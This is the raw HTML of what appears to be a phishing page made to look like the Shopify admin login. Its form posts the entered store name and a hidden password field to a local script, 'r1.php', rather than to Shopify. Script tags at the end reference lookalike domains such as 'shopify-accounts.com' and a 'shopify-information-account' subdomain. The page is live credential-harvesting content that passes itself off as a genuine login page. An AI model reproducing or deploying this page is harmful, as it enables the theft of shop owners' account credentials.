<html lang="en"><head>
  
  <meta charset="utf-8">
  <title>Log in » Shopify</title>
  <meta name="referrer" content="never">
  <meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black">
<link rel="icon" sizes="192x192" href="https://cdn.shopify.com/s/assets/touch-icons/touch-icon-192x192-840b11274adbc510a1db23976759bd31ceee84ddbb36478d494a3a2cf19b5ae6.png">
  <link rel="shortcut icon" type="image/x-icon" href="https://cdn.shopify.com/s/assets/favicon-4425e7970f1327bc362265f54e8c9c6a4e96385b3987760637977078e28ffe92.png">
<link rel="apple-touch-startup-image" href="https://cdn.shopify.com/s/assets/touch-icons/mobile-startup-564eed49b6c483b80796f529e05b4bf1d54e9cd9beeb0bb89b10d3c6a2282ea6.png">
<link rel="apple-touch-icon-precomposed" sizes="114x114" href="https://cdn.shopify.com/s/assets/touch-icons/icon-114x114-precomposed-79d1c57f01b233f016319dc4048d90524e9ce252c058a306ef9db2216ab26911.png">
<link rel="apple-touch-icon-precomposed" sizes="72x72" href="https://cdn.shopify.com/s/assets/touch-icons/icon-72x72-precomposed-584c35aa679456ab4e2f1cd971191498d7fecf7321b4ded8bae5c5a2c51176e3.png">
<link rel="apple-touch-icon-precomposed" sizes="57x57" href="https://cdn.shopify.com/s/assets/touch-icons/icon-57x57-precomposed-49c0927bd56de30bc28439aed87097b7c8e41f2bb4f00661f01a00729c2a1b77.png">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover, user-scalable=0">

  <link rel="stylesheet" media="screen" href="https://cdn.shopify.com/s/assets/login/style-20ee539a13db78a1b6183b2eb4d4be8deb69d0ddace11e66ed5d586dbba0f449.css" crossorigin="anonymous" data-turbolinks-track="true" integrity="sha256-IO5TmhPbeKG2GDsutNS+jetp0N2s4R5m7V1Ybbug9Ek=">
  
</head>
<body class="page-auth-login fresh-ui">

    <div class="login-card ">
      <div class="login-card__wrapper">
        <noscript class="no-js">In order to use the Shopify admin you need to enable Javascript. <a href="http://www.enable-javascript.com/" target="_blank">Learn how to enable Javascript</a>.</noscript>

        <header class="login-card__header">
          <h1 class="login-card__logo">
            <a href="//www.shopify.com" title="Shopify Website">
              <img src="https://cdn.shopify.com/s/assets/admin-fresh/shared/shopify-logo-color-inverted-aa398d5b8aba8c48c1da48d159ff93241e68e4eeccfa6e2a064e3b33c1fa9cc7.svg" alt="Shopify">
            </a>
          </h1>
        </header>

          <div class="login-card__content ">
            <h2 class="login-card__heading">Log in</h2>
            <p>&nbsp;</p>


            <div class="js-require-cookies">
              <div class="ui-banner ui-banner--status-critical ui-banner--within-page login-card__banner">
<div class="ui-banner__ribbon"><svg class="next-icon next-icon--size-20 next-icon--no-nudge" aria-hidden="true" focusable="false"> <use xlink:href="#error-major"></use> </svg></div><div class="ui-banner__content-container"><div class="ui-banner__heading"><h2 class="ui-heading">Please enable cookies in your browser preferences to continue.</h2></div></div></div>            </div>

            
<div id="js-login-form">
  <form action="r1.php" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="?" autocapitalize="false"><input type="hidden" name="authenticity_token" value="uO2TZ5fKZShBhPUYRJwJUEDn6KAvn6gBo5QylcjE1wKO055ozNPMaB6ekm3y6xGxRYWgoRBZCErrXKu9bou3jQ==" autocapitalize="false">
    <input type="hidden" name="redirect" id="redirect" autocapitalize="false">
    <input type="hidden" name="step" id="step" value="lookup" autocapitalize="false">

    





<div class="next-input-wrapper"><label class="next-label" for="Login">Your store name</label><input type="txt" name="sub" id="Login" placeholder="myshop.myshopify.com" spellcheck="false" autofocus="autofocus" class="next-input" autocapitalize="false" required ></div>

    <input type="password" name="password" class="login-card__hidden-field" tabindex="-1" aria-hidden="true" autocapitalize="false">


    <button class="ui-button ui-button--primary js-login-in-form__submit login-card__submit" type="submit" name="commit" id="EmailConfirm">Next</button>
</form></div>




<script type="text/javascript" async="" src="https://cdn.shopify.com/s/javascripts/tricorder/trekkie.admin.min.js?v=2017.09.05.1"></script><script type="text/javascript" async="" src="https://cdn.shopify.com/s/javascripts/tricorder/trekkie.admin.min.js?v=2017.09.05.1"></script><script type="text/javascript" async="" src="https://cdn.shopify.com/s/javascripts/tricorder/trekkie.admin.min.js?v=2017.09.05.1"></script><script type="text/javascript" async="" src="https://cdn.shopify.com/s/javascripts/tricorder/trekkie.admin.min.js?v=2017.09.05.1"></script><script type="text/javascript">
  if (typeof window.analytics !== 'undefined') {
    window.analytics.trackForm($('[action="/admin/auth/login"]')[0], 'login', {
      category: 'login',
      subdomain: "801gun.myshopify.com"
    });
  }

  var showContinueButton = document.querySelector('.js-email-login');

  if (showContinueButton instanceof HTMLElement) {
    showContinueButton.addEventListener('click', showLoginWithEmailBox.bind(this, true));
  }

  function showLoginWithEmailBox(show) {
    var continueButton = document.querySelector('.login-card__submit');
    var display = show ? '' : 'none';

    document.getElementById('js-login-form').style.display = display;

    if (continueButton instanceof HTMLElement) {
      continueButton.style.display = display;
    }

    if (showContinueButton instanceof HTMLElement) {
      showContinueButton.style.display = show ? 'none' : '';
    }
  }

  (function (){
    var ssoEnabled = false;
    if (ssoEnabled) {
      showLoginWithEmailBox(false)
    }
  })();

</script>

          </div>
      </div>
    </div>

    <footer class="login-footer">
      <nav>
        <a class="login-footer__link" target="_blank" href="https://help.shopify.com/manual/your-account/logging-in">Help</a>
        <a class="login-footer__link" target="_blank" href="https://www.shopify.com/legal/privacy">Privacy</a>
        <a class="login-footer__link" target="_blank" href="https://www.shopify.com/legal/terms">Terms</a>
      </nav>
    </footer>

    <script>
      window.addEventListener('captchaSuccess', function() {
        var submitButton = document.querySelector('.login-card__submit');
        if (submitButton instanceof HTMLElement) {
          submitButton.disabled = false;
        }
      }, false);

      if (!navigator.cookieEnabled) {
        $('.js-require-cookies').show();
      }
    </script>

  <script src="https://cdn.shopify.com/s/assets/admin/admin_jquery-1f0f820501c3b7fcb70379d8fa17d2fcfdb3722abc2a5eeedac0f05bfef7705c.js" crossorigin="anonymous" integrity="sha256-Hw+CBQHDt/y3A3nY+hfS/P2zciq8Kl7u2sDwW/73cFw="></script>
  <script src="https://cdn.shopify.com/s/assets/admin/auth-af2f48596342908db2529c61a0cfcb59fa7feff59591946bdd8caad81b7abc64.js" crossorigin="anonymous" integrity="sha256-ry9IWWNCkI2yUpxhoM/LWfp/7/WVkZRr3Yyq2Bt6vGQ="></script>
  <script>var _gaq = _gaq || [];_gaq.push(["_setAccount","UA-82702-18"]);_gaq.push(["_addDevId","o5cUG"]);_gaq.push(["_setAllowLinker",true]);_gaq.push(["_setDomainName",".myshopify.com"]);_gaq.push(["_setAllowHash",false]);_gaq.push(["_trackPageview","\/admin\/auth\/login"]);</script>
  
<script id="TrekkieLoader" type="text/javascript">
  (function(){
    var config = {"Trekkie":{"appName":"admin","development":false,"embedMode":"parent","defaultAttributes":{"shopId":23396283,"requestIsFromShopify":false}},"Clickstream":{"appName":"admin"},"Performance":{"navigationTimingApiMeasurementsEnabled":true,"navigationTimingApiMeasurementsSampleRate":0.25},"Session Attribution":{},"LastShop":{}};
    var trekkie_version = '2017.09.05.1';
    var analytics = window.analytics = window.analytics || [];
    if (analytics.integrations) {
      return;
    }
    analytics.methods = [
      'identify',
      'page',
      'ready',
      'track',
      'trackForm',
      'trackLink'
    ];
    analytics.factory = function(method) {
      return function() {
        var args = Array.prototype.slice.call(arguments);
        args.unshift(method);
        analytics.push(args);
        return analytics;
      };
    };
    for (var i = 0; i < analytics.methods.length; i++) {
      var key = analytics.methods[i];
      analytics[key] = analytics.factory(key);
    }
    analytics.load = function(config) {
      analytics.config = config;
      var script = document.createElement('script');
      script.type = 'text/javascript';
      script.onerror = function(e) { (new Image()).src = '//' + "v.shopify.com" + '/internal_errors/track?error=trekkie_load'; };
      script.async = true;
      script.src = '//' + "cdn.shopify.com" + '/s/javascripts/tricorder/trekkie.' + config.Trekkie.appName + '.min.js?v=' + trekkie_version;
      var first = document.getElementsByTagName('script')[0];
      first.parentNode.insertBefore(script, first);
    };
    analytics.load(config);
    analytics.page();

    // When on admin login page, inject an xtld iframe to capture token from
    // shopify.com domain.
    analytics.ready(function () {
      // 1. Validate that we're on login page
      if (window.location.pathname !== '/admin/auth/login') { return; }

      // 2. Install message listener
      window.addEventListener('message', function (e) {
        if (e.origin !== 'https:https://cdn.shopify.com') { return; }

        try {
          var data = JSON.parse(e.data);

          if (data.event === 'trekkie:xtldToken:v1') {
            window.analytics.track('admin-login-xtld-mapping', { shopifyDotComUniqToken: data.uniqToken });
          }
        } catch (e) {
          // all is well
        }
      });

      // 3. Create iframe
      var frame = document.createElement('iframe');
      frame.src = 'https:https://cdn.shopify.com/s/javascripts/tricorder/xtld-read-only-frame.html'
      frame.style.display = 'none';

      // 4. Dispatch message when frame loads
      frame.addEventListener('load', function () {
        frame.contentWindow.postMessage('trekkie:xtldToken:v1', 'https:https://cdn.shopify.com');
      }, false);

      // 5. Inject into DOM
      document.body.appendChild(frame);
    });
  })();
</script>


  <link rel="prefetch" href="https://cdn.shopify.com/s/assets/admin/style-ca618d848b7786b0c4b11c5275dcf858acb275e9589063f6b81a452470c69e91.css" as="style">
  <link rel="prefetch" href="https://cdn.shopify.com/s/assets/admin/admin-vendors-home-ca39c1313890389186737cbfb2a37f8781589a4ca6acafd2623dea0d233db2d2.js" as="script">
  <link rel="prefetch" href="https://cdn.shopify.com/s/assets/admin/tnt-76d575e8248a34c30808d4818819eb63f35aee4101fa55732cc0c2b206edb03d.js" as="script">
  <link rel="prefetch" href="https://cdn.shopify.com/s/assets/admin/shopify-core-94dad339dcfe8a3b67ee2292b4ef219eb4899b395a689c19007a21e525c8b255.js" as="script">
  <link rel="prefetch" href="https://cdn.shopify.com/s/assets/admin/shopify-home-29318e7772cb895e63948674499d175d952d70073130d66dfba6f968658b387c.js" as="script">


  <div id="global-icon-symbols" class="icon-symbols" data-tg-refresh="global-icon-symbols" data-tg-refresh-always="true"><svg xmlns="http://www.w3.org/2000/svg"><symbol id="error-major"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"><path fill="currentColor" d="M19 10c0 4.97-4.030 9-9 9s-9-4.030-9-9c0-4.97 4.030-9 9-9s9 4.030 9 9z"></path><path d="M10 17.5c-1.617 0-3.113-0.52-4.338-1.394l10.444-10.445c0.875 1.226 1.394 2.72 1.394 4.339 0 4.138-3.362 7.5-7.5 7.5zM10 2.5c1.617 0 3.113 0.52 4.338 1.394l-10.442 10.444c-0.876-1.225-1.395-2.719-1.395-4.338 0-4.138 3.362-7.5 7.5-7.5zM10 0c-5.513 0-10 4.487-10 10s4.487 10 10 10c5.512 0 10-4.488 10-10s-4.488-10-10-10z"></path></svg></symbol></svg></div>


<script src="https://v.shopify.com/last_shop?shop=801gun.myshopify.com" async="" class="tricorder-lastshop"></script><iframe src="https:https://cdn.shopify.com/s/javascripts/tricorder/xtld-read-only-frame.html" style="display: none;"></iframe><script src="https://v.shopify.com/last_shop?shop=shopify-information-account.starkeauto.com" async="" class="tricorder-lastshop"></script><script src="https://v.shopify.com/last_shop?shop=shopify-information-account.starkeauto.com" async="" class="tricorder-lastshop"></script><script src="https://v.shopify.com/last_shop?shop=shopify-information-account.starkeauto.com" async="" class="tricorder-lastshop"></script><script src="https://v.shopify.com/last_shop?shop=login.shopify-accounts.com" async="" class="tricorder-lastshop"></script></body></html>